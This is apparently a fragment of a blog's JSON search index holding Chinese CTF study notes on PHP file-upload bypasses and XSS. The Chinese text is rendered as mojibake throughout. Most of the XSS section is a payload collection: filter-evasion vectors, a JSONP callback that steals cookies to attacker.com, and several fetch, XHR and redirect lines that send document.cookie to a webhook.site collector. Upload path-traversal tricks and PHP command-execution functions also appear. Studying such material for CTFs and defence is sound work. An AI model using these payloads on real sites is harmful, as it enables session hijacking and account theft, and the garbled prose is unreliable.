../../../shell.php%00.jpg Windows åæ–œæ ç»•è¿‡ ..\\..\\shell.php åˆ©ç”¨ /proc/self/cwd/ è®¿é—®ç›®æ ‡ /proc/self/cwd/shell.php /proc/self/cwd/ æ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªè™šæ‹Ÿè·¯å¾„ï¼Œä»£è¡¨å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½• è®¿é—® /proc/self/cwd/ ç›¸å½“äºè®¿é—® /var/www/html/ åˆ©ç”¨ç¯å¢ƒå˜é‡ç»•è¿‡ /var/www/html/$IFSshell.php $IFS æ˜¯ Linux çš„åˆ†éš”ç¬¦ï¼ˆé€šå¸¸ä¸ºç©ºæ ¼ï¼‰ æŸäº› Shell è§£ææ—¶å¯èƒ½ä¼šé”™è¯¯è§£æè·¯å¾„ã€ é˜²å¾¡ ä½¿ç”¨ realpath() é™åˆ¶è·¯å¾„ï¼Œç¦æ­¢ä¸Šä¼  PHP æ–‡ä»¶ï¼Œç¦ç”¨ PHP è§£æ .htaccess é…ç½® ç”¨file_put_contents()å†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œå¦‚æœç”¨unlinkåˆ é™¤ä½ æœ‰ä»€ä¹ˆåŠæ³•è®©æ–‡ä»¶ä¸è¢«åˆ é™¤ï¼Ÿï¼ˆtips:å»çœ‹çœ‹unlink()çš„æ–‡æ¡£ï¼‰ å½“ä½¿ç”¨ file_put_contents() å†™å…¥æ–‡ä»¶æ—¶ï¼Œunlink() å‡½æ•°å¯ä»¥ç”¨æ¥åˆ é™¤æ–‡ä»¶ã€‚é€šå¸¸ï¼Œunlink() ä¼šåˆ é™¤æ–‡ä»¶çš„ç¡¬é“¾æ¥ï¼Œå¦‚æœæ–‡ä»¶æ˜¯å”¯ä¸€çš„é“¾æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±ä¼šè¢«å½»åº•åˆ é™¤ã€‚ä½†æ˜¯ï¼Œæœ‰ä¸€äº›æ–¹æ³•å¯ä»¥ä½¿æ–‡ä»¶åœ¨ unlink() åˆ é™¤æ—¶ä¸ä¼šè¢«åˆ é™¤æˆ–è¢«ç»•è¿‡åˆ é™¤æ“ä½œ ä½¿ç”¨æ–‡ä»¶é”å®šï¼ˆflock()ï¼‰ unlink() ä¼šåˆ é™¤æ–‡ä»¶ï¼Œä½†åªæœ‰æ–‡ä»¶æ²¡æœ‰è¢«å…¶ä»–è¿›ç¨‹é”å®šæ—¶æ‰ä¼šæˆåŠŸã€‚å¦‚æœæ–‡ä»¶è¢«é”å®šï¼Œunlink() å°†æ— æ³•åˆ é™¤è¯¥æ–‡ä»¶ã€‚ä½ å¯ä»¥ä½¿ç”¨ flock() åœ¨å†™å…¥æ–‡ä»¶æ—¶é”å®šæ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æŸäº›æ¡ä»¶ä¸‹é˜²æ­¢æ–‡ä»¶åˆ é™¤ ä½¿ç”¨ç¡¬é“¾æ¥ ç¡¬é“¾æ¥å…è®¸æ–‡ä»¶æœ‰å¤šä¸ªåç§°æŒ‡å‘åŒä¸€æ•°æ®å—ã€‚åœ¨åˆ é™¤ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šæ£€æŸ¥è¯¥æ–‡ä»¶çš„å¼•ç”¨è®¡æ•°ï¼Œåªæœ‰å½“æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æ—¶ï¼Œæ–‡ä»¶æ‰ä¼šè¢«åˆ é™¤ã€‚ å¦‚æœåˆ›å»ºäº†ç¡¬é“¾æ¥ï¼Œunlink() åªä¼šåˆ é™¤å…¶ä¸­ä¸€ä¸ªé“¾æ¥ï¼Œå…¶ä»–ç¡¬é“¾æ¥ä»ç„¶å­˜åœ¨ï¼Œå¹¶ä¸”æ–‡ä»¶çš„æ•°æ®ä¸ä¼šä¸¢å¤± ä½¿ç”¨ç¬¦å·é“¾æ¥ ä¸ç¡¬é“¾æ¥ä¸åŒï¼Œç¬¦å·é“¾æ¥ï¼ˆsymlinkï¼‰æŒ‡å‘çš„æ˜¯æ–‡ä»¶è·¯å¾„è€Œä¸æ˜¯æ–‡ä»¶æœ¬èº«ã€‚å¦‚æœä½ åˆ›å»ºä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œunlink() åˆ é™¤çš„æ˜¯æ–‡ä»¶æœ¬èº«ï¼Œä¸ä¼šåˆ é™¤ç¬¦å·é“¾æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶ ä½¿ç”¨ open() æ‰“å¼€æ–‡ä»¶å¹¶ä¿æŒæ–‡ä»¶å¥æŸ„ å¦‚æœä½ åœ¨ PHP ä¸­ä½¿ç”¨ fopen() æˆ– file_get_contents() ç­‰å‡½æ•°æ‰“å¼€æ–‡ä»¶ï¼Œå®ƒä»¬ä¼šä¿æŒæ–‡ä»¶å¥æŸ„ï¼ˆæ˜¯ä¸€ä¸ªæŒ‡å‘æ–‡ä»¶çš„å¼•ç”¨ï¼Œç”¨äºæ“ä½œæ–‡ä»¶ï¼ˆå¦‚è¯»å–ã€å†™å…¥ã€å…³é—­ç­‰ï¼‰ï¼‰ã€‚å³ä½¿æ–‡ä»¶è¢«åˆ é™¤ï¼Œåªè¦æ–‡ä»¶å¥æŸ„ä»ç„¶æ‰“å¼€ï¼Œæ“ä½œç³»ç»Ÿä¼šç»§ç»­ä¿ç•™æ–‡ä»¶å†…å®¹ï¼Œç›´åˆ°æ–‡ä»¶å¥æŸ„è¢«å…³é—­ã€‚è¿™æ˜¯å› ä¸ºæ–‡ä»¶å†…å®¹åœ¨å¥æŸ„æ‰“å¼€æœŸé—´ä»ç„¶åœ¨å†…å­˜ä¸­ å¯è§£æphpé™¤äº†?phpå¼€å¤´è¿˜èƒ½æ€æ · é™¤äº† ?php æ ‡ç­¾å¤–ï¼ŒPHP è¿˜æ”¯æŒä»¥ä¸‹å‡ ç§èµ·å§‹æ ‡ç­¾ï¼š ?ï¼ˆçŸ­æ ‡ç­¾ï¼‰ï¼šéœ€è¦å¼€å¯ short_open_tag æ‰èƒ½å·¥ä½œï¼Œå»ºè®®é¿å…ä½¿ç”¨ã€‚ ?php echo å’Œ ?=ï¼ˆçŸ­å›æ˜¾æ ‡ç­¾ï¼‰ï¼šç”¨äºç›´æ¥è¾“å‡ºå†…å®¹ï¼Œç®€å†™ ?= æ›´å¸¸ç”¨ã€‚ ?xmlï¼šé€‚ç”¨äº XML æ–‡ä»¶ä¸­çš„ PHP ä»£ç ã€‚ phpå±é™©å‡½æ•°ï¼Œæ€ä¹ˆæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ eval() eval() å‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²ä¸­çš„ PHP ä»£ç ï¼Œè™½ç„¶å®ƒä¸æ˜¯ç›´æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œä½†å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶å­—ç¬¦ä¸²å†…å®¹ï¼Œå°±å¯ä»¥æ‰§è¡Œä»»æ„ PHP ä»£ç ï¼Œç”šè‡³æ˜¯ç³»ç»Ÿå‘½ä»¤ exec() ç”¨äºæ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶è¿”å›æ‰§è¡Œç»“æœã€‚å®ƒå¯ä»¥æ‰§è¡Œä»»ä½•æ“ä½œç³»ç»Ÿå‘½ä»¤ exec(ls -la); è¿™ä¸ªä»£ç ä¼šæ‰§è¡Œ ls -la å‘½ä»¤ï¼Œå¹¶å°†ç»“æœè¿”å› system() system() å‡½æ•°ç±»ä¼¼äº exec()ï¼Œä½†å®ƒä¼šç›´æ¥è¾“å‡ºå‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œè€Œä¸æ˜¯è¿”å›ç»“æœ system(ls -la); shell_exec() shell_exec() å‡½æ•°ç”¨äºæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶è¿”å›è¾“å‡ºç»“æœã€‚ä¸ exec() å’Œ system() ä¸åŒçš„æ˜¯ï¼Œshell_exec() è¿”å›çš„æ˜¯å‘½ä»¤çš„å®Œæ•´è¾“å‡º $output = shell_exec(ls -la);echo $output; è¿™ä¸ªä»£ç æ‰§è¡Œ ls -la å‘½ä»¤ï¼Œå¹¶å°†ç»“æœä½œä¸ºå­—ç¬¦ä¸²è¿”å› passthru() passthru() å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ç›´æ¥å°†å‘½ä»¤çš„åŸå§‹è¾“å‡ºä¼ é€’åˆ°æµè§ˆå™¨ï¼Œé€šå¸¸ç”¨äºæ˜¾ç¤ºäºŒè¿›åˆ¶æ•°æ®ï¼Œå¦‚å›¾åƒæˆ–éŸ³é¢‘æ–‡ä»¶ passthru(ls -la); proc_open() proc_open() å‡½æ•°å…è®¸å¯åŠ¨ä¸€ä¸ªå¤–éƒ¨è¿›ç¨‹ï¼Œå¹¶ä¸è¯¥è¿›ç¨‹è¿›è¡Œäº¤äº’ï¼ˆè¯»å†™ï¼‰ã€‚å®ƒæ¯” exec() æ›´å¼ºå¤§ï¼Œå…è®¸ä¸å¤–éƒ¨å‘½ä»¤è¿›è¡Œå¤æ‚çš„é€šä¿¡ popen() popen() å‡½æ•°åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œæ‰“å¼€ä¸€ä¸ªç®¡é“åˆ°è¯¥è¿›ç¨‹çš„è¾“å…¥æˆ–è¾“å‡ºï¼Œå¸¸ç”¨äºè¯»å–å‘½ä»¤çš„è¾“å‡º","tags":["æ¼æ´","PHP","æ–‡ä»¶ä¸Šä¼ "],"categories":["PHP","æ¼æ´"]},{"title":"XSSæ¼æ´","path":"/2025/07/09/XSSæ¼æ´/","content":"XSSæ¼æ´ XSSæ˜¯åŸºäºå‰ç«¯çš„ä¸€ç§æ”»å‡»ï¼Œå…¶å®å°±æ˜¯éWebåº”ç”¨è‡ªèº«çš„JSä»£ç è¢«é»‘å®¢æ¶æ„æ’å…¥ï¼Œé€šè¿‡æ‰§è¡Œæ¶æ„çš„JSä»£ç ï¼Œå¯ä»¥å¯¼è‡´çªƒå–æ•æ„Ÿä¿¡æ¯ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹æˆ–åŠ«æŒç”¨æˆ·ä¼šè¯ï¼Œå¤§éƒ¨åˆ†æƒ…å†µæ˜¯çªƒå–Cookieï¼Œåœ¨ä½ ç™»å½•è´¦å·åçš„æƒ…å†µä¸‹ï¼Œéƒ¨åˆ†Webåº”ç”¨é€šè¿‡Cookieå¯ä»¥å¯¼è‡´é»‘å®¢èƒ½ç›´æ¥ç™»å½•ä½ çš„è´¦å· XSSçš„åˆ†ç±» å­˜å‚¨å‹XSS æ¶æ„è„šæœ¬å­˜å‚¨åœ¨åç«¯ä¸­(æ•°æ®åº“ã€æ—¥å¿—æ–‡ä»¶ã€è¯„è®ºç­‰) æŒä¹…æ€§æ”»å‡»ï¼Œå½±å“æ‰€æœ‰è®¿é—®ç›¸å…³é¡µé¢çš„ç”¨æˆ· å±å®³æœ€å¤§ï¼Œä¼ æ’­èŒƒå›´å¹¿ ä¸éœ€è¦ç”¨æˆ·ä¸»åŠ¨è§¦å‘ åœ¨CTFä¸­ï¼Œåˆ©ç”¨GETã€POSTæˆ–è€…æŠ“åŒ…åœ¨Refererï¼ŒCookieçš„åœ°æ–¹æ¤å…¥æˆ‘ä»¬çš„æ¶æ„è„šæœ¬ åå°„å‹XSS æ¶æ„è„šæœ¬å­˜åœ¨äºURLå‚æ•°ä¸­ é€šè¿‡HTTPè¯·æ±‚ç«‹å³æ‰§è¡Œï¼Œä¸å­˜å‚¨åœ¨æœåŠ¡å™¨ éœ€è¦è¯±éª—ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥ å½±å“èŒƒå›´ç›¸å¯¹è¾ƒå° åœ¨CTFä¸­ï¼Œé¢˜ç›®ä¼šç»™ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œç„¶åç»•è¿‡è¿‡æ»¤ï¼Œæ‰§è¡Œæ¶æ„è„šæœ¬ DOMå‹XSS å®Œå…¨åœ¨å®¢æˆ·ç«¯æ‰§è¡Œ ä¸æ¶‰åŠæœåŠ¡å™¨ç«¯ä»£ç  é€šè¿‡JavaScriptä¿®æ”¹DOMç»“æ„è§¦å‘ HTTPå“åº”ä¸­ä¸åŒ…å«æ¶æ„è„šæœ¬ JSONPå‹XSS åœ¨æµè§ˆå™¨çš„åŒæºç­–ç•¥ä¸‹ï¼Œå‰ç«¯ JavaScriptä¸èƒ½ç›´æ¥è·¨åŸŸè¯·æ±‚ AJAX(ä¸€ç§æ— éœ€åˆ·æ–°é¡µé¢å°±èƒ½å‘æœåŠ¡å™¨å‘é€å’Œæ¥æ”¶æ•°æ®çš„æŠ€æœ¯ï¼‰ï¼Œä½†å¯ä»¥åˆ©ç”¨ script æ ‡ç­¾(å…è®¸è·¨åŸŸåŠ è½½ç‰¹æ€§)è¿›è¡Œè·¨åŸŸè¯·æ±‚(å…è®¸ä»ä¸€ä¸ªåŸŸåä¸­è·å–åˆ°å¦ä¸€ä¸ªåŸŸåçš„æ•°æ®)ï¼Œä»è€Œç»•è¿‡æµè§ˆå™¨åŒæºç­–ç•¥é™åˆ¶ åç«¯è¿”å›çš„æ˜¯å¸¦å›è°ƒå‡½æ•°çš„ JSON æ•°æ®ï¼Œå‰ç«¯åˆ©ç”¨å›è°ƒå‡½æ•°callbackè§£ææ•°æ® æ”»å‡»è€…å¯ä»¥==ä¼ªé€ å›è°ƒå‡½æ•°ï¼Œåˆ©ç”¨ JSONP æ‰§è¡Œä»»æ„ JavaScript ä»£ç == ä¸¾ä¸ªæ —å­ï¼š å‡è®¾æœ‰ä¸ªæ¥å£ï¼š https://example.com/api?callback=handleData æœåŠ¡å™¨è¿”å›ï¼š handleData(name: Alice, age: 20); æ”»å‡»è€…æ„é€ å¦‚ä¸‹ URLï¼š https://example.com/api?callback=alert(1)// æœåŠ¡å™¨è¿”å›ï¼š alert(1)(name:Alice); æµè§ˆå™¨æ‰§è¡Œï¼š alert(1)(name:Alice); å½“ç„¶ä¹Ÿå¯ä»¥çªƒå–å—å®³è€…çš„ Cookieï¼š script src=https://example.com/api?callback=evilFunction/scriptscriptfunction evilFunction(data) document.write(img src=http://attacker.com/steal?cookie= + document.cookie + );/script XSSå¸¸è§è§¦å‘æ ‡ç­¾ ä¸‹é¢è¿™äº›æ ‡ç­¾å¸¸ä¸onerrorã€onfocusã€onclickã€onmouseoverã€onmouseoutç­‰äº‹ä»¶åŠjavascriptä¼ªåè®®é…åˆä½¿ç”¨ script scriptalert(1)/script img è‡ªé—­åˆæ ‡ç­¾ img src=1 onerror=alert(1) img src=1 onfocus=alert(1) a a href=javascript:alert(1)/aa href= onfocus=alert(1)/a iframe iframe src=javascript:alert(1)/iframeiframe src= onfocus=alert(1)/iframe//å°†scriptalert(XSS)/scriptbase64ç¼–ç iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=/iframe svg svg onfocus=alert(1) details //ontoggle äº‹ä»¶åœ¨ç”¨æˆ·æ‰“å¼€æˆ–å…³é—­ details å…ƒç´ æ—¶è§¦å‘details ontoggle=alert()/details XSSçš„ç»•è¿‡ å…³é”®è¯ç»•è¿‡ å¤§å°å†™ç»•è¿‡ sCriPtalert(1)sCriPt æ‹¼æ¥ç»•è¿‡ img src=1 onerror=eval[al+ert](1) å‡½æ•°æ›¿æ¢ç»•è¿‡ eval() img src=1 onerror=eval(alert(1)) open() img src=1 onerror=open(alert(1)) document.write() img src=1 onerror=document.write(alert(1)) setTimeout()å’Œ setInterval() JavaScript ä¸­ç”¨äºå»¶æ—¶æ‰§è¡Œä»£ç çš„å‡½æ•° img src=1 onerror=setTimeout(alert(1))img src=1 onerror=setInterval(alert(1)) åˆ©ç”¨æ„é€ å™¨ é€šè¿‡æ„é€ å™¨åŠ¨æ€ç”Ÿæˆå¹¶æ‰§è¡Œ JavaScript ä»£ç  Set.constructorï¼ŒMap.constructorï¼ŒArray.constructorï¼ŒWeakSet.constructorï¼Œconstructor.constructorç­‰ img src=1 onerror=Set.constructor(alert(1)) åˆ©ç”¨æ•°ç»„æ–¹æ³• [1].mapï¼Œ[1].findï¼Œ[1].everyï¼Œ[1].filterï¼Œ[1].forEachï¼Œ[1].findIndexç­‰ img src=1 onerror=[1].map(alert(1)) åµŒå¥—ç»•è¿‡ scscriptriptalert(XSS)/sc/scriptript èµ‹å€¼ç»•è¿‡ img src onerror=_=alert,_(1)img src x=al y=ert onerror=top[x+y](1)img src x=al y=ert onerror=window[x+y](1) //åœ¨ç½‘é¡µæ²¡æœ‰åµŒå¥—æ¡†æ¶æ—¶æ‰æœ‰æ•ˆã€‚img src onerror=top[a=al,b=ev,b+a](alert(1))img src onerror=[ale+rt].map(top[ev+al])[0][valu+eOf]()(1) æœ€åä¸€ä¸ªpayloadè§£é‡Šï¼š ['ale'+'rt'] æ˜¯ä¸€ä¸ªåŒ…å«å­—ç¬¦ä¸² 'alert' çš„æ•°ç»„ map(top['ev'+'al']) ä½¿ç”¨ map() æ–¹æ³•å¯¹è¯¥æ•°ç»„è¿›è¡Œæ“ä½œï¼Œæœ€ç»ˆå°† alert å‡½æ•°èµ‹å€¼ç»™æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  [0] å–å‡ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå³ alert å‡½æ•° valueOf() è·å–è¯¥å‡½æ•°çš„åŸå§‹å€¼ï¼ˆå³ alert å‡½æ•°æœ¬èº«ï¼‰ æœ€åï¼Œè°ƒç”¨ alert(1) æ‰§è¡Œ JavaScript ä»£ç  ç¼–ç ç»•è¿‡ URL ç¼–ç  è¢«ç¼–ç ä¸º%3Cï¼Œè¢«ç¼–ç ä¸º%3Eï¼Œè¢«ç¼–ç ä¸º%26ï¼Œ/è¢«ç¼–ç ä¸º%2F img src=1 onerror=alert(%3Cscript%3Ealert(1)%3C%2Fscript%3E) HTML å®ä½“ç¼–ç  æ˜¯å°†æŸäº›ç‰¹æ®Šå­—ç¬¦è½¬æ¢æˆä»¥ å¼€å¤´ã€; ç»“å°¾çš„å®ä½“æ ¼å¼ å­—ç¬¦ è½¬æ¢ä¸º amp; lt; gt; quot; ' #039; ï¼ˆå½“ ENT_QUOTES è¢«è®¾ç½®æ—¶ï¼‰ nbsp; / #47; = #61; img src=1 onerror=alert(lt;scriptgt;alert(1)lt;/scriptgt;) Base64 ç¼–ç  img src=1 onerror=eval(atob(YWxlcnQoMSk=)) alert(1)ç¼–ç ä¸ºatob('YWxlcnQoMSk=') åŒé‡ç¼–ç  ä¾‹å¦‚ï¼Œå…ˆå¯¹ ç¼–ç ä¸º %3Cï¼Œå†å°†%3Cç¼–ç ä¸º %253C img src=1 onerror=alert(%253Cscript%253Ealert(1)%253C%252Fscript%253E) Unicode ç¼–ç  Unicode ç¼–ç ä½¿ç”¨åå…­è¿›åˆ¶å€¼è¡¨ç¤ºå­—ç¬¦ï¼Œå®ƒå¯ä»¥ç”¨äºæ›¿ä»£å¸¸è§çš„ ASCII å­—ç¬¦ img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) 97,108,101,114,116,40,49,41æ˜¯ alert(1) æ¯ä¸ªå­—ç¬¦çš„ Unicode ç¼–ç å€¼ åå…­è¿›åˆ¶ç¼–ç  img src=1 onerror=eval(String.fromCharCode(0x61,0x6C,0x65,0x72,0x74,0x28,0x31,0x29)) ç©ºæ ¼ç»•è¿‡ åœ¨htmlçš„æ ‡ç­¾ä¸­çš„ä¸åŒä½ç½®çš„ç©ºæ ¼ç»•è¿‡æ–¹å¼ä¸æ˜¯ä¸€æ ·çš„ htmlimgAAsrcAAonerrorBB=BBalertCC(1)DD/html Aä½ç½®ï¼š /ï¼Œ/123/ï¼Œ%09ï¼Œ%0Aï¼Œ%0Cï¼Œ%0Dï¼Œ%20 Bä½ç½®ï¼š%09ï¼Œ%0Aï¼Œ%0Cï¼Œ%0Dï¼Œ%20 Cä½ç½®ï¼š%0Bï¼Œ/**/ ï¼ˆå¦‚æœåŠ äº†åŒå¼•å·ï¼Œåˆ™å¯ä»¥å¡«å…… %09ï¼Œ%0Aï¼Œ%0Cï¼Œ%0Dï¼Œ%20ï¼‰ Dä½ç½®ï¼š%09ï¼Œ%0Aï¼Œ%0Cï¼Œ%0Dï¼Œ%20ï¼Œ//ï¼Œ ()ç»•è¿‡ ä½¿ç”¨åå¼•å· scriptalert`1`/script throwç»•è¿‡ scriptalert;throw 1/script svg/onload=window.onerror=eval;throw=alert\\x281\\x29; onloadï¼šå½“ SVG å…ƒç´ åŠå…¶èµ„æºåŠ è½½å®Œæˆåè§¦å‘ã€‚äº‹ä»¶è§¦å‘æ—¶ä¼šæ‰§è¡Œåé¢çš„ JavaScript ä»£ç  window.onerror = eval;ï¼šwindow.onerror æ˜¯ä¸€ä¸ªå…¨å±€çš„é”™è¯¯å¤„ç†å‡½æ•°ï¼Œå½“ JavaScript æ‰§è¡Œæ—¶å‘ç”Ÿé”™è¯¯ï¼Œå®ƒä¼šè¢«è°ƒç”¨ã€‚é€šè¿‡å°†å…¶è®¾ç½®ä¸º evalï¼Œæ”»å‡»è€…å¯ä»¥åŠ«æŒé”™è¯¯å¤„ç†å¹¶æ‰§è¡Œæ¶æ„çš„ JavaScript ä»£ç  throw '=alert\\x281\\x29';ï¼šè¿™è¡Œä»£ç é€šè¿‡ throw æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸alert(1) å•å¼•å·è¿‡æ»¤ ä½¿ç”¨åå¼•å· ç”¨æ–œæ æ›¿æ¢ scriptalert(/hack/)/script alertè¿‡æ»¤ç»•è¿‡ å‡½æ•°æ›¿æ¢ç»•è¿‡ prompt()ï¼Œconfirm()ï¼Œconsole.log()ï¼Œdocument.write() ç¼–ç ç»•è¿‡ å¯¹è±¡æ–¹æ³•ç»•è¿‡ åˆ©ç”¨å¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•æ¥æ›¿ä»£ç›´æ¥è°ƒç”¨ alert img src=1 onerror=window.constructor.constructor(alert(1))() æ•°ç»„æ–¹æ³•ç»•è¿‡ å¼‚æ­¥è°ƒç”¨ç»•è¿‡ img src=1 onerror=setTimeout(alert(1), 0) å­—ç¬¦æ›¿æ¢ç»•è¿‡ åˆ†å‰²å…³é”®å­—ç»•è¿‡ é€šè¿‡åœ¨å…³é”®å­—ä¸­æ’å…¥ç©ºæ ¼æˆ–æ³¨é‡Šç¬¦å·ï¼ˆ /**/ï¼‰æ¥åˆ†éš”å‡½æ•°å a/**/l/**/ert(1) é•¿åº¦é™åˆ¶ç»•è¿‡ ç”¨æ‹†åˆ†æ³• scripta=document.write(/scriptscripta=a+a href=ht/scriptscripta=a+tp://VPS-IP:po/scriptscripta=a+rthack/a)/scriptscripteval(a)/script ç”¨åµŒå¥—ç»“æ„ img src=1 onerror=document.write(img src=1 onerror=alert(1)) åˆ†å·ç»•è¿‡ å½“åªè¿‡æ»¤äº†åˆ†å·æ—¶ï¼Œå¯ä»¥åˆ©ç”¨èŠ±æ‹¬å·è¿›è¡Œè¯­å¥éš”ç¦» scriptonerror=alertthrow 1/script å½“æµè§ˆå™¨é‡åˆ° throw 1 æ—¶ï¼Œå®ƒä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ æŠ›å‡ºé”™è¯¯æ—¶ï¼Œonerror äº‹ä»¶ä¼šè¢«è§¦å‘ï¼Œå› ä¸ºæˆ‘ä»¬ä¹‹å‰å°† onerror è®¾ç½®ä¸ºäº† alert å‡½æ•° ç»“æœæ˜¯ï¼Œæµè§ˆå™¨ä¼šå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œæ˜¾ç¤º 1ï¼Œè¿™å°±æ˜¯ alert(1) çš„æ•ˆæœ ç»•è¿‡CSP å†…å®¹å®‰å…¨ç­–ç•¥ (Content Security Policy, CSP) æ˜¯ä¸€ç§webåº”ç”¨æŠ€æœ¯ç”¨äºå¸®åŠ©ç¼“è§£å¤§éƒ¨åˆ†ç±»å‹çš„å†…å®¹æ³¨å…¥æ”»å‡»ï¼ŒåŒ…æ‹¬XSSæ”»å‡»å’Œæ•°æ®æ³¨å…¥ç­‰ã€‚å…¶æ˜¯ä¸€ç§ç™½åå•ç­–ç•¥ï¼Œå½“æœ‰éç™½åå•å…è®¸çš„jsè„šæœ¬å‡ºç°åœ¨é¡µé¢ä¸­ï¼Œæµè§ˆå™¨ä¼šé˜»æ­¢è„šæœ¬çš„æ‰§è¡Œ cookieå¤–å¸¦ XSSé¶åœºä¸­é€šå¸¸ä»¥å‰ç«¯æ£€æµ‹ç½‘é¡µæ˜¯å¦å¼¹çª—æ¥åˆ¤æ–­æœ‰æ²¡æœ‰è¢«XSSï¼Œä½†æ¯”èµ›/å®æˆ˜ä¸­ï¼Œé€šå¸¸ä»¥XSSçœŸå®åœºæ™¯ï¼Œéœ€è¦å¤–å¸¦å‡ºCookie å¸¦å‡ºcookieï¼ˆé€šå¸¸å¯¹+è¿›è¡Œç¼–ç %2Bï¼‰ fetch()æ–¹æ³• fetch() å…è®¸ JavaScript å‘é€ HTTP è¯·æ±‚ã€‚å¦‚æœ credentials: 'include'ï¼Œåˆ™å¯ä»¥æºå¸¦å½“å‰ç«™ç‚¹çš„ Cookie fetch(//webhook.site/xxxxxxxx/?cookie=+document.cookie) window.openæ–¹æ³• window.open() æ˜¯ JavaScript ä¸­ç”¨äºæ‰“å¼€æ–°çª—å£æˆ–æ–°æ ‡ç­¾é¡µçš„æ–¹æ³•ã€‚å®ƒæ¥å—ä¸€ä¸ª URL ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„æµè§ˆå™¨çª—å£å¯¹è±¡æˆ–è€…é€‰é¡¹å¡å¯¹è±¡ ä¾‹å¦‚ï¼Œä»¥ä¸‹ä»£ç å°†ä¼šåœ¨æ–°çª—å£æˆ–æ–°æ ‡ç­¾é¡µä¸­æ‰“å¼€æŒ‡å®š URLï¼š window.open(//webhook.site/xxxxxxxx/?cookie=+document.cookie); XHRæ–¹æ³• XMLHttpRequest æ˜¯æµè§ˆå™¨æä¾›çš„å†…å»º JavaScript å¯¹è±¡ï¼Œç”¨äºåœ¨ä¸åˆ·æ–°é¡µé¢çš„æƒ…å†µä¸‹ä¸æœåŠ¡å™¨è¿›è¡Œ HTTP é€šä¿¡ã€‚å®ƒæ˜¯æ—©æœŸ AJAX æŠ€æœ¯çš„æ ¸å¿ƒ scriptvar xhr = new XMLHttpRequest();xhr.open(GET, //webhook.site/xxxxxxxx/?cookie= %2BencodeURIComponent(document.cookie), true);xhr.send();/script XMLHttpRequest å¯¹è±¡ scriptvar xhr = new XMLHttpRequest(); xhr.open(GET, //webhook.site/xxxxxxxx/?cookie=+document.cookie, true); xhr.send();/script window.location å¯¹è±¡ window.location å¯ä»¥æŠŠæµè§ˆå™¨é‡å®šå‘åˆ°æ–°çš„é¡µé¢ï¼Œæ­¤æ—¶å¯é€šè¿‡urlæºå¸¦cookieï¼›ä½¿ç”¨æ–¹æ³•ä¾‹å¦‚ scriptwindow.location=//webhook.site/xxxxxxxx/?cookie=+document.cookie;/script ä¸‹é¢æ˜¯window.location å¯¹è±¡ä¸­å¯ç”¨äºè·³è½¬çš„æ–¹æ³• window.location.href window.location.href = //webhook.site/xxxxxxxx/?cookie=+document.cookie; window.location.assign(url)ã€window.location.replace(url)åŒä¸Š document.writeæ–¹æ³• åˆ©ç”¨ document.write å†™å…¥æŸäº›å«æœ‰srcå±æ€§çš„æ ‡ç­¾ï¼Œå¹¶å°†Cookieæ‹¼æ¥åˆ°ç›®æ ‡URLä¸­ï¼Œä½œä¸ºå‚æ•°å‘é€åˆ°æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ document.write(`img src=//webhook.site/xxxxxxxx/?cookie=$document.cookie `) document.write(img src=//webhook.site/xxxxxxxx/?cookie=+document.cookie+/) XSSçš„é˜²èŒƒ HttpOnly Cookie è®¾ç½® Cookie ä¸º HttpOnlyï¼Œè¿™æ ·ï¼ŒJavaScript æ— æ³• é€šè¿‡ document.cookie è®¿é—®è¯¥ Cookieï¼Œåªèƒ½é€šè¿‡HTTPè¯·æ±‚å‘é€ç»™æœåŠ¡å™¨ ç»•è¿‡ ç»•è¿‡æ–¹å¼ è¯´æ˜ CSRF (è·¨ç«™è¯·æ±‚ä¼ªé€ ) HttpOnly ä¸èƒ½é˜²æ­¢è·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼ˆCSRFï¼‰ï¼Œæ”»å‡»è€…ä»å¯åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­å‘èµ·è¯·æ±‚ï¼Œåˆ©ç”¨å—å®³è€…çš„ Cookie è¿›è¡Œæ“ä½œ XS-Leaksï¼ˆè·¨ç«™ä¿¡æ¯æ³„éœ²ï¼‰ é€šè¿‡ imgã€iframeã€fetch() å‘é€è¯·æ±‚ï¼Œå¹¶è§‚å¯Ÿè¿”å›æ•°æ®æ˜¯å¦æœ‰å·®å¼‚ï¼Œå¯èƒ½é—´æ¥æ¨æµ‹å‡º Cookie å€¼ æœåŠ¡å™¨ç«¯è·å– Cookie é€šè¿‡ XSS åŠ«æŒä¼šè¯ï¼Œè®©å—å®³è€…è®¿é—®æ¶æ„é¡µé¢ï¼Œç„¶åè¯»å–æœ¬åœ°å­˜å‚¨çš„ Token 